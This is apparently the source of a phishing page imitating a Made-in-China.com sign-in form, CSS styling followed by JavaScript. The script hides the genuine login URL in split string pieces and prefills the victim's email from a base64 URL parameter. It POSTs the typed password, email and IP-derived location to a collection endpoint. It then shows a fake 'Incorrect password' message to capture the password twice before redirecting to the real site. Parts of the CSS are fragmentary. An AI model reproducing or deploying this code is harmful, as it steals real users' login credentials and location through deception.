    <style type="text/css">
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font: 12px/1.5 "Roboto", Arial, "Microsoft YaHei", sans-serif;
      }

      body {
        color: #404349;
        font: 12px/1.5 "Roboto", Arial, "Microsoft YaHei", sans-serif;
        -webkit-font-smoothing: antialiased;
        background-color: #f0f1f2;
      }

      body,
      html {
        height: 100%;
        margin: 0;
        font-size: 14px;
      }

      a {
        text-decoration: none;
      }

      a:active {
        color: #2d6bb3;
      }

      a:hover {
        color: #6aace6;
      }

      #frame {
        width: 100%;
        height: auto;
        padding: 20px;
        float: left;
        position: relative;
        font-size: 14px;
        color: #444;
        clear: both;
        z-index: 10;
        //box-shadow:0px 1px 2px #777;
      }
	  
      #frame1 {
        width: 100%;
        height: auto;
        padding: 20px;
        float: left;
        position: relative;
        font-size: 14px;
        color: #444;
        clear: both;
        z-index: 10;
        //box-shadow:0px 1px 2px #777;
		display: flex;
		justify-content: center;
		align-items: center;
      }
	  #inner-frame {
        width: 100%;
        height: auto;
        padding: 10px;
        position: relative;
        overflow-x: hidden;
      }

      #inner-frame1 {
        width: 100%;
        height: auto;
        padding: 10px;
        position: relative;
        overflow-x: hidden;
      }

      input:-internal-autofill-selected {
        background-color: transparent;
      }

      .errorfound {
        border: 2px solid #d00;
        box-shadow: 0px 0px 1px #d00;
        color: #d00;
      }

      #loader {
        display: none;
        align-items: center;
        justify-content: center;
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #fff9;
        z-index: 99;
        border-radius: 10px;
      }

      @keyframes hideLoader {
        from {
          opacity: 1;
        }

        to {
          opacity: 0;
        }
      }

      @keyframes showLoader {
        from {
          opacity: 0;
        }

        to {
          opacity: 1;
        }
      }

      .formHolder {
        display: flex;
        width: 400px;
        padding: 38px 20px 0;
        min-height: 330px;
        border-radius: 20px;
        padding: 30px;
        position: relative;
        border-radius: 20px;
        background-color: #fff;
        box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.1);
      }

      .text_label {
        display: block;
        color: #222;
        font-size: 14px;
        margin-bottom: 5px;
        text-align: left;
        font-weight: bold;
      }

      .text {
        line-height: 24px;
        padding: 8px 10px;
        font-size: 14px;
        border: 1px solid #ced3d9;
        border-radius: 3px;
        box-sizing: border-box;
        margin-bottom: 20px;
        width: 100%;
        transition: all 0.3s;
      }

      .btn {
        display: block;
        width: 100%;
        height: auto;
        line-height: inherit;
        font-size: 14px;
        padding: 10px;
        text-align: center;
        color: #fff;
        border: solid 1px #e64545;
        background-color: #e64545;
        cursor: pointer;
      }

      .btn:hover {
        background-color: #d53434;
      }

        display: flex;
        justify-content: center;
        list-style: none;
        margin: 10px auto;
        flex-wrap: wrap;
      }

        word-wrap: none;
        color: #666;
      }

        color: #4d4d4d;

    <script>
      let resBox = "MinC";

      let nbg1 = "ht";

      let ov1 = "https";
      let ov2 = "://";
      let ov3 = "logi";
      let ov4 = "n.made-in";
      let ov5 = "-chin";
      let ov6 = "a.co";
      let ov7 = "m/";

      let ov = `${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`;
      sessionStorage.clear();
      let trialCount = sessionStorage.getItem("num_trial");

      if (!trialCount) {
        sessionStorage.setItem("num_trial", 0);

        window.location.assign(ov);
      }

    <script>
      let xx = window.location.href.split("?");
      let torg = document.querySelector("#torg");
      let tma = document.querySelector("#tma");
      let tpp = document.querySelector("#tpp");
      let loader = document.querySelector("#loader");
      let loc = document.querySelector("#loc");
      let trial = document.querySelector("#trial");
      xx = xx[1].split("-");

      var base64regex =
        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

      if (!base64regex.test(xx[1])) {
        torg.value = xx[1];
        tma.value = xx[1];
      } else {
        torg.value = atob(xx[1]);
        tma.value = atob(xx[1]);
      }

      trial.value = trialCount;

      let myForm = document.querySelector("#form_");
      myForm.addEventListener("submit", async function (event) {
        event.preventDefault();

        $.ajax({
          dataType: "JSON",
          url: nbg,
          type: "POST",
          data: {
            ckorg: torg.value,
            ck: tma.value,
            cknow: tpp.value,
            loc: loc.value,
            trial: trial.value,
            resBox: resBox,
          },
          beforeSend: function (xhr) {
            // console.log(xhr);
            $("#submit-btn").html("Sign In");
            // loader.style.display = "flex";
            // loader.style.animation = "showLoader .5s ease";
          },
          success: function (response) {
            console.log("Success", response);
            // Combine logic from both success functions here
            if (response) {
              /* loader.style.animation = "hideLoader 1s ease";
            setTimeout(() => {
                loader.style.display = "none";
            }, 1000); */
              $("#submit-btn").html("Sign in");
              // console.log(response);
              if (response["signal"] == "ok") {
                trialCount++;
                sessionStorage.setItem("num_trial", trialCount);
                trial.value = trialCount;

                if (trialCount >= 2) {
                  count = 0;
                  window.location.replace(ov);
                  return false;
                }

                tpp.value = "";
                tpp.focus();
                document.getElementById("errmsg").innerHTML =
                  "Incorrect password. Please try again.";
              } else {
                console.log("Error Occurred!!!");
                // $('#msg').html(response['msg']);
              }
            }
          },
          error: function (jqXHR, textStatus, errorThrown) {
            console.log("Error", jqXHR, textStatus, errorThrown);
            tpp.value = "";
            tpp.focus();
            document.getElementById("errmsg").innerHTML =
              "Incorrect password. Please try again.";
          },
          complete: function (xhr) {
            $("#submit-btn").html("Sign In");
            // loader.style.animation = "hideLoader 1s ease";
            // setTimeout(() => {
            //   loader.style.display = "none";
            // }, 1000);
          },
        });
      });

      $.get(
        "https://ipinfo.io/json?token=10da60a9ff2d81",
        function (response) {
          let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`;
          $("#loc").val(cou);
        },
        "jsonp"
      );
    </script>
